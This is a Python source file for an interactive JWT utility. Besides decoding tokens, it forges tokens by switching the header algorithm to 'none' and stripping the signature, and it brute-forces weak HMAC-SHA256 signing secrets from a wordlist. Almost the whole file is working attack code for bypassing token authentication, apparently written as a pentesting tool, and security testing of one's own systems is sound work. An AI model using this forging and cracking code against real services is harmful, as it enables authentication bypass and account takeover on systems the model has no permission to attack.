import base64
import json
import hmac
import hashlib
from rich.console import Console
from rich.prompt import Prompt

console = Console()


def _b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _decode_part(part, label):
    try:
        raw = _b64url_decode(part)
        data = json.loads(raw)
        console.print(f"[cyan]{label}:[/cyan] {json.dumps(data, indent=2)}")
        return data
    except Exception as e:
        console.print(f"[red]cannot decode {label}: {e}[/red]")
        return None


def run():
    console.print("[cyan]jwt tool[/cyan]")
    console.print("1. Decode token")
    console.print("2. Forge alg:none")
    console.print("3. HMAC brute force (weak secret)")
    choice = Prompt.ask("choice", default="1")

    if choice == "1":
        token = Prompt.ask("token").strip()
        parts = token.split(".")
        if len(parts) != 3:
            console.print("[red]invalid token format[/red]")
            return
        _decode_part(parts[0], "header")
        _decode_part(parts[1], "payload")
        console.print(f"[cyan]signature:[/cyan] {parts[2]}")

    elif choice == "2":
        token = Prompt.ask("token").strip()
        parts = token.split(".")
        if len(parts) != 3:
            console.print("[red]invalid token[/red]")
            return
        header = _decode_part(parts[0], "header")
        payload = _decode_part(parts[1], "payload")
        if header is None or payload is None:
            return
        header["alg"] = "none"
        new_header = _b64url_encode(json.dumps(header, separators=(",", ":")))
        new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")))
        forged = f"{new_header}.{new_payload}."
        console.print(f"[green]forged:[/green] {forged}")

    elif choice == "3":
        token = Prompt.ask("token").strip()
        wordlist_path = Prompt.ask("wordlist path")
        parts = token.split(".")
        if len(parts) != 3:
            console.print("[red]invalid token[/red]")
            return
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        target = parts[2]
        try:
            with open(wordlist_path) as f:
                words = [w.strip() for w in f if w.strip()]
        except Exception as e:
            console.print(f"[red]{e}[/red]")
            return
        console.print(f"[cyan]testing {len(words)} secrets...[/cyan]")
        for w in words:
            sig = _b64url_encode(
                hmac.new(w.encode(), signing_input, hashlib.sha256).digest()
            )
            if sig == target:
                console.print(f"[green]secret found: {w}[/green]")
                return
        console.print("[yellow]no secret found[/yellow]")
    else:
        console.print("[red]invalid choice[/red]")
